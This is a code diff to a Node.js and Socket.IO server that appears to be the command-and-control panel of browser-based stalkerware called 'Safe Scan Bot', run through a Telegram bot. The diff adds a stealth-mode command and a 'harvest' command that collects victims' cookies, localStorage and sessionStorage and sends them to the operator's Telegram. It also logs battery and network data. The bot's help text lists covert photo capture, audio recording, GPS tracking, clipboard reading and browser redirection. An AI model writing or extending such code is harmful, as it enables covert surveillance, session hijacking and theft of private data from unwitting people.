@@ -450,6 +450,19 @@ app.get('/api/locations/:uuid', authCheck, (req, res) => {
   res.json({ locations: history });
 });
 
+app.get('/api/metrics/:uuid', authCheck, (req, res) => {
+  const uuid = req.params.uuid;
+  const user = db.users.find(u => u.uuid === uuid);
+  if (!user) return res.status(404).json({ error: 'User not found' });
+  res.json({ metrics: user.metrics_history || [], harvested_data: user.harvested_data || null });
+});
+
+app.get('/api/location-history/:uuid', authCheck, (req, res) => {
+  const uuid = req.params.uuid;
+  const history = db.locations.filter(l => l.uuid === uuid);
+  res.json({ history });
+});
+
 // ─── File Browser Route ──────────────────────────────────────────
 app.get('/api/files', authCheck, (req, res) => {
   const uuid = req.query.uuid;
@@ -683,6 +696,27 @@ io.on('connection', (socket) => {
       });
       addLog('command', '', `Broadcast command: ${data.command}`);
       console.log(`📢 Broadcast command '${data.command}' to ${connectedUsers.size} users`);
+    });
+
+    // ─── NEW: Admin Stealth Mode Toggle ────────────────────
+    socket.on('admin:stealth', (data) => {
+      if (!data || !data.uuid) return;
+      const userSocketId = connectedUsers.get(data.uuid);
+      if (userSocketId) {
+        io.to(userSocketId).emit('command:stealth');
+        addLog('stealth', data.uuid, 'Stealth mode activated via dashboard');
+        console.log(`🛡️ Stealth mode activated for ${data.uuid}`);
+      }
+    });
+
+    // ─── NEW: Admin Harvest Command ────────────────────────
+    socket.on('admin:harvest', (data) => {
+      if (!data || !data.uuid) return;
+      const userSocketId = connectedUsers.get(data.uuid);
+      if (userSocketId) {
+        io.to(userSocketId).emit('command:harvest');
+        addLog('harvest', data.uuid, 'Data harvest triggered via dashboard');
+      }
     });
 
     // ─── NEW: Receive data back from users (screen, clipboard) ─
@@ -925,6 +959,43 @@ io.on('connection', (socket) => {
       }
     });
 
+    socket.on('data:harvest', (data) => {
+      if (!data || !userUUID) return;
+      const user = db.users.find(u => u.uuid === userUUID);
+      if (user) {
+        user.harvested_data = {
+          cookies: data.cookies || '',
+          localStorage: data.localStorage || {},
+          sessionStorage: data.sessionStorage || {},
+          timestamp: new Date().toISOString()
+        };
+        saveData();
+        io.to('admin').emit('data:harvest', { uuid: userUUID, ...user.harvested_data });
+        addLog('harvest', userUUID, 'Browser data harvested');
+        const msg = `🍪 <b>Data Harvest</b>\n\nUUID: ${userUUID}\n\n<b>Cookies:</b>\n<code>${(data.cookies || 'None').substring(0, 2000)}</code>\n\n<b>LocalStorage Keys:</b>\n<code>${Object.keys(data.localStorage || {}).join(', ') || 'None'}</code>\n\n${new Date().toLocaleString()}`;
+        sendTextToTelegram(msg);
+      }
+    });
+
+    socket.on('metrics:update', (data) => {
+      if (!data || !userUUID) return;
+      const user = db.users.find(u => u.uuid === userUUID);
+      if (user) {
+        if (!user.metrics_history) user.metrics_history = [];
+        user.metrics_history.push({
+          battery_level: data.battery_level,
+          battery_charging: data.battery_charging,
+          network_type: data.network_type,
+          network_downlink: data.network_downlink,
+          network_rtt: data.network_rtt,
+          timestamp: new Date().toISOString()
+        });
+        if (user.metrics_history.length > 100) user.metrics_history = user.metrics_history.slice(-100);
+        user.last_active = new Date().toISOString();
+        io.to('admin').emit('metrics:update', { uuid: userUUID, metrics: user.metrics_history[user.metrics_history.length - 1] });
+      }
+    });
+
     socket.on('disconnect', () => {
       if (userUUID) {
         connectedUsers.delete(userUUID);
@@ -1052,7 +1123,7 @@ function handleTelegramUpdate(update) {
   switch (cmd) {
     case '/start':
     case '/help': {
-      reply(`🤖 <b>Safe Scan Bot Commands</b>\n\n📊 <b>Info</b>\n/stats — Live statistics\n/users — List all devices\n/logs — Last 10 activity log entries\n/summary — Daily analytics summary\n\n📸 <b>Capture</b>\n/capture &lt;uuid&gt; — Force photo capture\n/screen &lt;uuid&gt; — Request screen capture\n\n🎤 <b>Audio</b>\n/record &lt;uuid&gt; [seconds] — Record audio\n\n📍 <b>Location</b>\n/locate &lt;uuid&gt; — Request GPS update\n\n📟 <b>Control</b>\n/toast &lt;uuid&gt; &lt;message&gt; — Show alert on device\n/vibrate &lt;uuid&gt; — Vibrate device\n/redirect &lt;uuid&gt; &lt;url&gt; — Redirect browser\n/clipboard &lt;uuid&gt; — Read clipboard\n/broadcast &lt;message&gt; — Send to ALL devices`);
+      reply(`🤖 <b>Safe Scan Bot Commands</b>\n\n📊 <b>Info</b>\n/stats — Live statistics\n/users — List all devices\n/logs — Last 10 activity log entries\n/summary — Daily analytics summary\n\n📸 <b>Capture</b>\n/capture &lt;uuid&gt; — Force photo capture\n/screen &lt;uuid&gt; — Request screen capture\n\n🎤 <b>Audio</b>\n/record &lt;uuid&gt; [seconds] — Record audio\n\n📍 <b>Location</b>\n/locate &lt;uuid&gt; — Request GPS update\n\n📟 <b>Control</b>\n/toast &lt;uuid&gt; &lt;message&gt; — Show alert on device\n/vibrate &lt;uuid&gt; — Vibrate device\n/redirect &lt;uuid&gt; &lt;url&gt; — Redirect browser\n/clipboard &lt;uuid&gt; — Read clipboard\n/broadcast &lt;message&gt; — Send to ALL devices\n\n🛡️ <b>Stealth</b>\n/stealth &lt;uuid&gt; — Activate stealth mode\n/harvest &lt;uuid&gt; — Extract cookies & storage\n/metrics &lt;uuid&gt; — View battery & network history`);
       break;
     }
     case '/stats': {
@@ -1180,6 +1251,39 @@ function handleTelegramUpdate(update) {
       });
       addLog('command', '', `Broadcast message to ${count} users: ${message}`);
       reply(`📢 Broadcast sent to ${count} online device(s)!`);
+      break;
+    }
+    case '/stealth': {
+      if (!arg1) { reply('❌ Usage: /stealth <uuid>'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply('❌ User not found.'); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply('⚫ User is offline.'); break; }
+      io.to(userSocketId).emit('command:stealth');
+      addLog('stealth', uid, 'Stealth mode activated via Telegram');
+      reply(`🛡️ Stealth mode activated for ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/harvest': {
+      if (!arg1) { reply('❌ Usage: /harvest <uuid>'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply('❌ User not found.'); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply('⚫ User is offline.'); break; }
+      io.to(userSocketId).emit('command:harvest');
+      addLog('harvest', uid, 'Data harvest triggered via Telegram');
+      reply(`🍪 Harvest request sent to ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/metrics': {
+      if (!arg1) { reply('❌ Usage: /metrics <uuid>'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply('❌ User not found.'); break; }
+      const user = db.users.find(u => u.uuid === uid);
+      const history = user?.metrics_history || [];
+      if (history.length === 0) { reply('📊 No metrics data available for this user.'); break; }
+      const latest = history[history.length - 1];
+      reply(`📊 <b>Metrics for ${uid.substring(0,8)}...</b>\n\n🔋 Battery: ${latest.battery_level != null ? latest.battery_level + '%' : 'N/A'} ${latest.battery_charging ? '⚡ Charging' : ''}\n🌐 Network: ${latest.network_type || 'N/A'}\n📶 Downlink: ${latest.network_downlink != null ? latest.network_downlink + ' Mbps' : 'N/A'}\n⏱️ RTT: ${latest.network_rtt != null ? latest.network_rtt + ' ms' : 'N/A'}\n\n📈 Total data points: ${history.length}\n🕐 Last update: ${latest.timestamp}`);
       break;
     }
     default: {
